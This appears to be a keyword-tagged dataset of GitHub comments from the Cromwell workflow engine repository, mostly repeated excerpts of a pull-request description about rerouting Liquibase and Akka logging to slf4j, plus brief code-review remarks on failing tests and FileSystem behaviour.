https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:131,Testability,log,logs,131,"## Liquibase logging changes. This PR started out just fixing the leaking of Liquabase messages into stdout. Before this PR, from [logs from a recent run](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:246,Testability,Log,Logger,246,"## Liquibase logging changes. This PR started out just fixing the leaking of Liquabase messages into stdout. Before this PR, from [logs from a recent run](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:687,Testability,log,log,687,"## Liquibase logging changes. This PR started out just fixing the leaking of Liquabase messages into stdout. Before this PR, from [logs from a recent run](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1569,Testability,log,logs,1569,"2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquib",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1686,Testability,Log,Logger,1686,":59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). #",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2494,Testability,log,logging,2494,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2727,Testability,log,logback,2727,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2754,Testability,log,logging,2754,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2825,Testability,log,logging,2825,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2855,Testability,log,logging,2855,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2927,Testability,log,logging,2927,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:3041,Testability,log,log,3041,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:3126,Testability,log,logs,3126,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:3227,Testability,log,log,3227,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6815#issuecomment-1195910343:33,Deployability,update,updated,33,Looks like some tests need to be updated in response to these changes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6815#issuecomment-1195910343
https://github.com/broadinstitute/cromwell/pull/6815#issuecomment-1195910343:16,Testability,test,tests,16,Looks like some tests need to be updated in response to these changes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6815#issuecomment-1195910343
https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1198095781:34,Testability,test,test,34,"Looks good to me, but the failing test is a bit weird -- gut check says it's not related to your changes, but it doesn't seem like the kind of thing that should just flake out randomly either...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1198095781
https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457:708,Availability,failure,failure,708,"Is this to account for things that are ""provider-dependent"" as described in the [FileSystems JavaDoc](https://docs.oracle.com/javase/8/docs/api/java/nio/file/FileSystems.html)? I'm curious exactly what behavior you saw, such as `getFileSystem` returning a reference to a closed file system or throwing `FileSystemNotFoundException`. I think it's worth having a link to any documentation that describes any provider-dependent behavior or documenting our observations ourselves. I'm also still contemplating that potential gap between `getFileSystem` and `newFileSystem`. I'd love to avoid adding our own synchronization around this, but I guess that really depends on how the blob filesystem behaves and what failure modes look like and how we want to handle them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457
https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457:49,Integrability,depend,dependent,49,"Is this to account for things that are ""provider-dependent"" as described in the [FileSystems JavaDoc](https://docs.oracle.com/javase/8/docs/api/java/nio/file/FileSystems.html)? I'm curious exactly what behavior you saw, such as `getFileSystem` returning a reference to a closed file system or throwing `FileSystemNotFoundException`. I think it's worth having a link to any documentation that describes any provider-dependent behavior or documenting our observations ourselves. I'm also still contemplating that potential gap between `getFileSystem` and `newFileSystem`. I'd love to avoid adding our own synchronization around this, but I guess that really depends on how the blob filesystem behaves and what failure modes look like and how we want to handle them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457
